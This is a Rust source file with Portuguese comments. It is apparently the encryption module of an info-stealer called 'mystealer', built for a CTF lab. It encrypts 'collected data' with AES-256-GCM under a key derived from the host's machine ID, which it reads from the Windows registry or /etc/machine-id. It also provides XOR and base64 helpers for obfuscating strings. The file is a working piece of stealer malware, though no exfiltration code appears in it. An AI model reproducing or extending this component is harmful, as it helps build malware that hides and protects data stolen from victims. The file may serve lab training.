//! Módulo de Criptografia
//!
//! Fornece funções de criptografia para proteger dados coletados.

pub mod aes;

use thiserror::Error;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use argon2::Argon2;
use rand::RngCore;

/// Erros de criptografia
#[derive(Error, Debug)]
pub enum CryptoError {
    #[error("Falha na criptografia: {0}")]
    EncryptionFailed(String),
    
    #[error("Falha na descriptografia: {0}")]
    DecryptionFailed(String),
    
    #[error("Chave inválida")]
    InvalidKey,
    
    #[error("Dados corrompidos")]
    CorruptedData,
    
    #[error("Erro de IO: {0}")]
    IoError(#[from] std::io::Error),
}

/// Gerenciador de criptografia
pub struct CryptoManager {
    /// Chave de 256 bits
    key: [u8; 32],
}

impl CryptoManager {
    /// Cria novo gerenciador com chave derivada do sistema
    pub fn new() -> Result<Self, CryptoError> {
        let machine_id = Self::get_machine_identifier()?;
        let salt = Self::generate_salt();
        
        let key = Self::derive_key(&machine_id, &salt)?;
        
        Ok(Self { key })
    }
    
    /// Cria gerenciador com chave específica
    pub fn with_key(key: [u8; 32]) -> Self {
        Self { key }
    }
    
    /// Criptografa dados usando AES-256-GCM
    pub fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        let cipher = Aes256Gcm::new_from_slice(&self.key)
            .map_err(|_| CryptoError::InvalidKey)?;
        
        // Gerar nonce aleatório de 12 bytes
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        // Criptografar
        let ciphertext = cipher.encrypt(nonce, plaintext)
            .map_err(|e| CryptoError::EncryptionFailed(e.to_string()))?;
        
        // Formato: version(1) || nonce(12) || ciphertext
        let mut result = Vec::with_capacity(1 + 12 + ciphertext.len());
        result.push(0x01); // Versão do formato
        result.extend_from_slice(&nonce_bytes);
        result.extend(ciphertext);
        
        Ok(result)
    }
    
    /// Descriptografa dados
    pub fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if ciphertext.len() < 14 { // 1 + 12 + 1 (mínimo)
            return Err(CryptoError::CorruptedData);
        }
        
        // Verificar versão
        if ciphertext[0] != 0x01 {
            return Err(CryptoError::CorruptedData);
        }
        
        let cipher = Aes256Gcm::new_from_slice(&self.key)
            .map_err(|_| CryptoError::InvalidKey)?;
        
        let nonce = Nonce::from_slice(&ciphertext[1..13]);
        let encrypted_data = &ciphertext[13..];
        
        cipher.decrypt(nonce, encrypted_data)
            .map_err(|e| CryptoError::DecryptionFailed(e.to_string()))
    }
    
    /// Deriva chave usando Argon2
    fn derive_key(password: &str, salt: &[u8]) -> Result<[u8; 32], CryptoError> {
        let mut key = [0u8; 32];
        
        Argon2::default()
            .hash_password_into(password.as_bytes(), salt, &mut key)
            .map_err(|e| CryptoError::EncryptionFailed(e.to_string()))?;
        
        Ok(key)
    }
    
    /// Gera salt para derivação de chave
    fn generate_salt() -> [u8; 16] {
        // Salt fixo para consistência (em produção seria armazenado)
        let mut salt = [0u8; 16];
        // Usar dados consistentes do sistema
        let base = "mystealer-ctf-lab-2024";
        for (i, byte) in base.bytes().enumerate() {
            salt[i % 16] ^= byte;
        }
        salt
    }
    
    /// Obtém identificador único da máquina
    #[cfg(windows)]
    fn get_machine_identifier() -> Result<String, CryptoError> {
        use std::process::Command;
        
        // Tentar obter MachineGUID do registro
        let output = Command::new("reg")
            .args([
                "query",
                r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography",
                "/v",
                "MachineGuid"
            ])
            .output()?;
        
        if output.status.success() {
            let text = String::from_utf8_lossy(&output.stdout);
            // Parsear o GUID
            for line in text.lines() {
                if line.contains("MachineGuid") {
                    if let Some(guid) = line.split_whitespace().last() {
                        return Ok(guid.to_string());
                    }
                }
            }
        }
        
        // Fallback: usar hostname + username
        Ok(format!("{}-{}", 
            whoami::hostname(),
            whoami::username()
        ))
    }
    
    #[cfg(unix)]
    fn get_machine_identifier() -> Result<String, CryptoError> {
        // Tentar ler machine-id
        if let Ok(id) = std::fs::read_to_string("/etc/machine-id") {
            return Ok(id.trim().to_string());
        }
        
        if let Ok(id) = std::fs::read_to_string("/var/lib/dbus/machine-id") {
            return Ok(id.trim().to_string());
        }
        
        // Fallback: hostname + username
        Ok(format!("{}-{}", 
            whoami::hostname(),
            whoami::username()
        ))
    }
}

/// Funções de ofuscação de strings
pub mod obfuscation {
    /// XOR simples para ofuscar strings
    pub fn xor_string(input: &str, key: u8) -> Vec<u8> {
        input.bytes().map(|b| b ^ key).collect()
    }
    
    /// Deofuscar string XOR
    pub fn xor_deobfuscate(input: &[u8], key: u8) -> String {
        let bytes: Vec<u8> = input.iter().map(|b| b ^ key).collect();
        String::from_utf8_lossy(&bytes).to_string()
    }
    
    /// Base64 encode
    pub fn encode_base64(input: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(input)
    }
    
    /// Base64 decode
    pub fn decode_base64(input: &str) -> Result<Vec<u8>, base64::DecodeError> {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.decode(input)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_encrypt_decrypt() {
        let crypto = CryptoManager::with_key([0x42; 32]);
        
        let original = b"Hello, World!";
        let encrypted = crypto.encrypt(original).unwrap();
        let decrypted = crypto.decrypt(&encrypted).unwrap();
        
        assert_eq!(original.as_slice(), decrypted.as_slice());
    }
    
    #[test]
    fn test_xor_obfuscation() {
        use obfuscation::*;
        
        let original = "secret_password";
        let key = 0x42;
        
        let obfuscated = xor_string(original, key);
        let deobfuscated = xor_deobfuscate(&obfuscated, key);
        
        assert_eq!(original, deobfuscated);
    }
}

